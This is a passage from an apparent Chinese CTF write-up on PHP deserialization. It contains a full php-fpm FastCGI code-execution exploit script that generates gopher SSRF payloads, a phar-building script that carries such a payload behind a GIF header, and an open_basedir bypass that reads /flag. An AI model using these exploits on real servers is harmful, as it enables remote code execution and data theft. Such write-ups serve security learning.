class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gopher</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php echo &quot;PWNed&quot;;?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;--ext&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ext absolute path&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-if&#x27;</span>, <span class="string">&#x27;--include_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;evil.php absolute path&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url_format&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;generate gopher stream in url format&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>,const=<span class="number">1</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;--base64_format&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;generate gopher stream in base64 format&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>,const=<span class="number">1</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(args.code),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> args.ext <span class="keyword">and</span> args.include_file:</span><br><span class="line">        <span class="comment">#params[&#x27;PHP_ADMIN_VALUE&#x27;]=&#x27;extension = &#x27;+args.ext</span></span><br><span class="line">        params[<span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>]=<span class="string">&quot;extension_dir = /var/www/html\nextension = ant.so&quot;</span></span><br><span class="line">        params[<span class="string">&#x27;PHP_VALUE&#x27;</span>]=<span class="string">&#x27;auto_prepend_file = &#x27;</span>+args.include_file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url_format <span class="keyword">and</span> <span class="keyword">not</span> args.base64_format :</span><br><span class="line">        response = client.request(params, args.code)</span><br><span class="line">        <span class="built_in">print</span>(force_text(response))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = client.gopher(params, args.code)</span><br><span class="line">        <span class="keyword">if</span> args.url_format:</span><br><span class="line">            <span class="built_in">print</span>(urllib.quote(response))</span><br><span class="line">        <span class="keyword">if</span> args.base64_format:</span><br><span class="line">            <span class="built_in">print</span>(base64.b64encode(response))</span><br><span class="line"><span class="comment"># python2 exp.py 10.0.255.11 /var/www/html/index.php -p 9000 -c &quot;&lt;?php phpinfo(); ?&gt;&quot; -u</span></span><br><span class="line"><span class="comment"># %01%01%90%1E%00%08%00%00%00%01%00%00%00%00%00%00%01%04%90%1E%01%DB%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%90%1E%00%00%00%00%01%05%90%1E%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%90%1E%00%00%00%00</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为$test 的属性问题需要url编码</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Easytest()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;gopher://10.0.255.11:9000/_%01%01%90%1E%00%08%00%00%00%01%00%00%00%00%00%00%01%04%90%1E%01%DB%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%90%1E%00%00%00%00%01%05%90%1E%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%90%1E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.png&quot;</span>);</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="keyword">new</span> Main());</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;Panda.txt&quot;</span>,<span class="string">&quot;I am Panda&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问看到<code>PHPINFO</code>，但是很多函数被禁止了。并且目录限制仅<code>/var/www/html/tmp</code>.因此需要绕过。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">alias</a>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> mkdir(<span class="string">&#x27;/tmp/panda&#x27;</span>);chdir(<span class="string">&#x27;/tmp/panda&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);print_r(scandir(<span class="string">&#x27;/&#x27;</span>));readfile(<span class="string">&#x27;/flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>再一次脚本构造<code>SSRF</code>,最终得<code>Flag</code>.</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/flag.png" alt="flag"></p>
<h2 id="PHP-原生类"><a href="#PHP-原生类" class="headerlink" title="PHP 原生类"></a>PHP 原生类</h2><ul>
<li>参考-<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">I3m0n</a>师傅。又是有反序列化点，但是又找不到反序列化类时，可以利用<code>PHP</code>原生类也就是内置类。但有时有些原生类也不一定能反序列化，因为受<code>zend_class_unserialize_deny</code>影响，它可以禁止某些原生类的反序列化就像<code>disable_function</code>一样。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span 